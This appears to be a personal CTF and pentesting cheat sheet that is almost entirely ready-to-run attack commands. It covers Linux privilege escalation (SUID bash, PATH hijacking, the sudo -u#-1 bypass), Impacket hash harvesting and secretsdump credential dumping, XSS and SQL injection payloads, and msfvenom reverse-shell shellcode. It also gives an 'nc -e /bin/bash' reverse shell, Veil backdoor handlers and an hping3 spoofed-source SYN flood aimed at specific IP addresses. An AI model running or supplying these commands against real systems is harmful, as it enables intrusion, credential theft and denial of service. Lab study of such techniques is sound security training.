## I used to forget stuff when doing CTF and things. I build these notes little by little to help me remember things I failed to remember. This note doesn't contain everything. Nevertheless, I hope it can be useful. 

**Box Notes**
1. Always check /etc/sudoers.d
2. Always check /etc/crontab
3. Always check capabilities >>> getcap -r / 2>/dev/null
4. find / -perm -u=s -type f 2>/dev/null >>> to find some suid misconf
5. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
6. find / -user root -perm -4000 -print 2>/dev/null
7. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod +s /bin/bash` as root, bash -p
8. linpeas linenum pspy name ur shits
9. Always check `cat ~/.*history | less` or just `history`
10. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
11. Remember CVE-2019-13287 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
12. `.conf` file may contain something. (usually in /etc/apache2)
13. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
14. 
- SMB enum >>> smbclient -L //[IP], and continue with the shares name  smbclient //[IP]/[sharename]
- smbclient //[IP]/[sharename] --user=[username] --workgroup=[forest name] 
16. rpcclient --user=[username] [target-ip] -W [forest name]

**Impacket**
1. GetNPUsers.py >> This script can check of the usernames are existing and if they have Kerberos pre-authentication enabled

Usage: `python3 ~/scripts/impacket/examples/GetNPUsers.py [Forest]/ -usersfile [List of username file] -outputfile hash.txt -dc-ip [TARGET IP] -format john` >> format john so then u can crack the existing user hash

2. secretsdump.py >> Performs various techniques to dump hashes from the remote machine without executing any agent there. (SAMHashes, LSASecrets, NTDSHashes)

Example: 
`python3 ~/scripts/impacket/examples/secretsdump.py -ntds ntds.dit -system system.bak LOCAL`
`~/scripts/impacket/examples/secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>`
and many more.. go research on it.


**PATH Privesc**
### When it is not run directly, example:
/usr/bin/cat >>> cant
cat >>> can
1. cd /tmp
2. echo "/bin/bash" > [the misconfigured]
3. chmod +x [the misconfigured]
4. export PATH=/tmp:$PATH
5. Execute the misconfigured binary

# In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
/usr/bin/cat >>> can
1. function /usr/sbin/service { /bin/bash -p; }
2. export -f /usr/sbin/service
3. Execute the misconfigured binary


### Does not have to be in /tmp, u can create your own folder


**How to create environment variable**
1. export [varname]=[value]
2. echo $[varname]


**XSS**
1. <detail/open/ontoggle=alert()>
2. and bunch from portswigger..


**Little SQLI**
1. 'UNION SELECT 1,table_name,column_name FROM information_schema.columns -- -
2. 'UNION SELECT 1,group_concat(sql),3 FROM sqlite_master -- -


**Bufferoverflow**
1. Predict the size
2. msf-pattern_create.rb -l [the size] >>> we got the address
3. msf-pattern_offset.rb -l [the size] -q [the EIP address]
4. Generate shellcode
Example:
msfvenom -p windows/shell_reverse_tcp LHOST=[yourip] LPORT=[yourport] EXITFUNC=thread -f c -a x86 -b "\x00"

encode it with shikata_ga_nai if u want
-f >>> the output file language
-a >>> the architecture
-b >>> bad char

5. Got the shellcode, dont forget to put NOP'S '\x90'


**Fix your terminal**
1. python3 -c 'import pty;pty.spawn("/bin/bash");'
2. export TERM=xterm >>> so you can clear
3. ctrl + z >>> background
4. stty raw -echo
5. fg


**CTF Tools**
1. Forensics >> exiftool, volatility, zsteg, stegsolve, stegcracker, steghide
2. Way Back Machine can see everything, not only dead websites


**SSH with id_rsa**
1. chmod 600 id_rsa >>> for ours and ours alone 
2. ssh -i id_rsa [user]@[ip]


**Random**
1. hashcat --example-hash >> or just visit the one in the web
2. diff -y [file1] [file2] >> compare file side by side
3. binary mode FTP is better
4. watch -n 0 [stuff you want to watch]
5. when we have admin in windows, and meterpreter shell, try
	`run post/windows/manage/enable_rdp `
	and conenct rdp. Fun commands
6. Veil msfconsole combo
Generate
msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
7. nc -e /bin/bash [ip] [port]
8. from binascii import unhexlify >> unhexlify to convert hex to string
9. Generate wordlists with crunch
10. hping3 DOS
	hping3 -S [host] -p ++[initial_port] >>> Port status discovery (open/not)
	hping3 -S [host] -p [port] -a [disguised_host] --flood
	hping3 -S [host] -p [port] -a [disguised_host] --flood --rand-source

	example: sudo hping3 -S 45.33.32.156 -p 80 -a 173.203.36.104 --flood --rand-source -V >>> -V for verbose

